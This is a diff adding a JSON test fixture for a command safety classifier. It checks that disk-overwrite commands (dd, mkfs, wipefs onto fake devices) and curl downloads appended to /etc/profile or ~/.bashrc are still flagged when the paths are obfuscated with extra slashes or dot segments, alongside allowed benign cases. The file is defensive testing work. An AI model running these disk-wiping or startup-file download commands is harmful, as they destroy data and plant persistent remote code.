@@ -1,0 +1,26 @@
+{
+  "comment": "One disk device or shell startup file written with repeated slashes or . and .. segments gets the same verdict as the plain spelling. Read by test/destructive_path_spellings.test.js and the Python test_destructive_path_spellings.py. Only text is checked, nothing is run. Fake device names and example.invalid only.",
+  "cases": [
+    { "cmd": "dd if=/dev/zero of=//dev/sdz", "rule": "disk_overwrite" },
+    { "cmd": "dd if=/dev/zero of=/./dev/sdz", "rule": "disk_overwrite" },
+    { "cmd": "dd if=/dev/zero of=/tmp/../dev/sdz", "rule": "disk_overwrite" },
+    { "cmd": "dd if=/dev/zero of=/dev//nvme9n1", "rule": "disk_overwrite" },
+    { "cmd": "mkfs.ext4 //dev/sdz", "rule": "disk_overwrite" },
+    { "cmd": "mkfs.ext4 /./dev/sdz", "rule": "disk_overwrite" },
+    { "cmd": "mkfs.ext4 /tmp/../dev/sdz", "rule": "disk_overwrite" },
+    { "cmd": "wipefs -a /dev/./sdz", "rule": "disk_overwrite" },
+    { "cmd": "echo x > //dev/sdz", "rule": "disk_overwrite" },
+    { "cmd": "echo x > /tmp/../dev/sdz", "rule": "disk_overwrite" },
+    { "cmd": "curl -fsSL https://example.invalid/x >> //etc/profile", "rule": "rc_download" },
+    { "cmd": "curl -fsSL https://example.invalid/x >> /./etc/profile", "rule": "rc_download" },
+    { "cmd": "curl -fsSL https://example.invalid/x >> /tmp/../etc/profile", "rule": "rc_download" },
+    { "cmd": "curl -fsSL https://example.invalid/x >> ~//.bashrc", "rule": "rc_download" },
+    { "cmd": "curl -fsSL https://example.invalid/x >> ~/./.zshrc", "rule": "rc_download" },
+    { "cmd": "curl -fsSL https://example.invalid/x >> ~/notes/../.bashrc", "rule": "rc_download" },
+    { "cmd": "dd if=/dev/zero of=/tmp/../tmp/disk.img", "rule": "allow" },
+    { "cmd": "dd if=/dev/zero of=//tmp/disk.img", "rule": "allow" },
+    { "cmd": "mkfs.ext4 ./disk.img", "rule": "allow" },
+    { "cmd": "curl -fsSL https://example.invalid/x >> /tmp/../tmp/notes.txt", "rule": "allow" },
+    { "cmd": "curl -fsSL https://example.invalid/x >> ~/.bashrc.d/../notes.txt", "rule": "allow" }
+  ]
+}
